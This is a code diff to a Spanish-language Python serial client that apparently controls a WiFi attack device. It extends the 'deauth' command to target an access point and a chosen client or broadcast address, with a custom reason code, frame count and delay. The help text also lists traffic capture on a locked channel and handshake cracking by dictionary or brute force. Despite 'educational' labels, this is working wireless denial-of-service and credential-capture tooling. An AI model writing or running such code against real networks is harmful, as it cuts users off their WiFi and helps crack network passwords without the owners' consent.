@@ -157,7 +157,8 @@ def print_help() -> None:
     print("scan                    - Escanear redes WiFi (channel hopping)")
     print("stop                    - Detener operación actual")
     print("lock <MAC> <CANAL>      - Fijar canal y capturar tráfico de un AP")
-    print("deauth <MAC> <CANAL> <COUNT> - Enviar frames de deauthentication (educativo)")
+    print("deauth <AP_MAC> --client <MAC>|--broadcast --reason <1-255> [--count N] [--delay ms]")
+    print("                               - Enviar frames de deauthentication (educativo)")
     print("clients <MAC>                - Detectar clientes asociados a un AP")
     print("verify <modo> <pcap> <target> - Verificar handshake (dict/brute/raw)")
     print("status                  - Mostrar estado actual del dispositivo")
@@ -212,29 +213,93 @@ def parse_and_send_cmd(cmd_input: str, ser: serial.Serial) -> bool:
         else:
             print("[!] Uso: lock <MAC> <CANAL>  (ejemplo: lock AA:BB:CC:DD:EE:FF 6)")
     elif cmd_input.startswith("deauth"):
-        # deauth AA:BB:CC:DD:EE:FF 6 10
-        match = re.match(r"deauth\s+([0-9a-fA-F:]+)\s+(\d+)\s+(\d+)", cmd_input)
-        if match:
-            mac = match.group(1).upper()
-            channel = match.group(2)
-            count = match.group(3)
-            # Validar MAC (6 octetos)
-            if len(mac.split(':')) == 6:
-                # Validar canal 1-14
-                if 1 <= int(channel) <= 14:
-                    # Validar count 1-100
-                    if 1 <= int(count) <= 100:
-                        formatted_cmd = f"CMD:DEAUTH:{mac}:{channel}:{count}\n"
-                        print("[*] Enviando frames de deauthentication (vulnerabilidad 802.11)")
-                        ser.write(formatted_cmd.encode('utf-8'))
-                    else:
-                        print("[!] Count debe estar entre 1 y 100")
-                else:
-                    print("[!] Canal debe estar entre 1 y 14")
+        # Nuevo formato: deauth <ap_mac> --client <mac>|--broadcast --reason <1-255> [--count N] [--delay ms]
+        # Ej: deauth AA:BB:CC:DD:EE:FF --broadcast --reason 7 --count 10 --delay 100
+        mac_pattern = r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$'
+        
+        parts = cmd_input.split()
+        if len(parts) < 2:
+            print("[!] Uso: deauth <AP_MAC> --client <MAC>|--broadcast --reason <1-255> [--count N] [--delay ms]")
+            print("     Ej: deauth AA:BB:CC:DD:EE:FF --broadcast --reason 7 --count 10 --delay 100")
+            return True
+        
+        ap_mac = parts[1].upper()
+        if not re.match(mac_pattern, ap_mac):
+            print("[!] MAC del AP inválida. Formato: AA:BB:CC:DD:EE:FF")
+            return True
+        
+        # Parsear flags
+        client_mac = None
+        broadcast = False
+        reason = 7  # Default: Class 3 frame received
+        count = 10  # Default
+        delay = 100  # Default ms
+        
+        i = 2
+        while i < len(parts):
+            if parts[i] == "--broadcast":
+                broadcast = True
+            elif parts[i] == "--client" and i + 1 < len(parts):
+                client_mac = parts[i + 1].upper()
+                if not re.match(mac_pattern, client_mac):
+                    print("[!] MAC del cliente inválida. Formato: AA:BB:CC:DD:EE:FF")
+                    return True
+                i += 1
+            elif parts[i] == "--reason" and i + 1 < len(parts):
+                try:
+                    reason = int(parts[i + 1])
+                    if not (1 <= reason <= 255):
+                        print("[!] Reason code debe estar entre 1 y 255")
+                        return True
+                except ValueError:
+                    print("[!] Reason code debe ser un número entero")
+                    return True
+                i += 1
+            elif parts[i] == "--count" and i + 1 < len(parts):
+                try:
+                    count = int(parts[i + 1])
+                    if not (1 <= count <= 50):
+                        print("[!] Count debe estar entre 1 y 50 (límite pedagógico)")
+                        return True
+                except ValueError:
+                    print("[!] Count debe ser un número entero")
+                    return True
+                i += 1
+            elif parts[i] == "--delay" and i + 1 < len(parts):
+                try:
+                    delay = int(parts[i + 1])
+                    if not (10 <= delay <= 5000):
+                        print("[!] Delay debe estar entre 10 y 5000 ms")
+                        return True
+                except ValueError:
+                    print("[!] Delay debe ser un número entero")
+                    return True
+                i += 1
             else:
-                print("[!] MAC inválida. Formato esperado: AA:BB:CC:DD:EE:FF (6 octetos separados por ':')")
-        else:
-            print("[!] Uso: deauth <MAC> <CANAL> <COUNT>  (ejemplo: deauth AA:BB:CC:DD:EE:FF 6 10)")
+                print(f"[!] Flag desconocido: {parts[i]}")
+                return True
+            i += 1
+        
+        # Determinar MAC del cliente
+        if broadcast:
+            client_mac = "FF:FF:FF:FF:FF:FF"
+        elif client_mac is None:
+            # Por defecto, broadcast si no se especifica cliente
+            client_mac = "FF:FF:FF:FF:FF:FF"
+            print("[*] Sin --client especificado, usando broadcast")
+        
+        # Construir comando para firmware
+        # Formato: CMD:DEAUTH:AP_MAC:CLIENT_MAC:REASON:COUNT:DELAY_MS
+        formatted_cmd = f"CMD:DEAUTH:{ap_mac}:{client_mac}:{reason}:{count}:{delay}\n"
+        
+        # Log pedagógico
+        reason_desc = {1: "Unspecified", 2: "Previous auth invalid", 7: "Class 3 frame from nonassoc STA"}
+        reason_text = reason_desc.get(reason, f"Custom ({reason})")
+        print(f"[*] DEAUTH → AP: {ap_mac} | Client: {client_mac}")
+        print(f"[*] Reason: {reason_text} | Frames: {count} | Delay: {delay}ms")
+        print(f"[*] Enviando frames de deauthentication (vulnerabilidad 802.11)")
+        
+        ser.write(formatted_cmd.encode('utf-8'))
     elif cmd_input.startswith("clients"):
         # clients AA:BB:CC:DD:EE:FF
         match = re.match(r"clients\s+([0-9a-fA-F:]+)", cmd_input)
